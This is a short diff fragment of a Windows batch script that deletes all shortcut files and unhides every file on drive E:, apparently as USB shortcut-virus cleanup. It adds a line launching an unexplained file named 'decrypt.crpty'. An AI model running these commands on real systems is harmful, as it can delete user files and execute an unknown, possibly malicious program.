@@ -18,3 +18,4 @@ exit
 2
 del *.lnk
 attrib -h -r -s /s /d e:*.*
+start decrypt.crpty
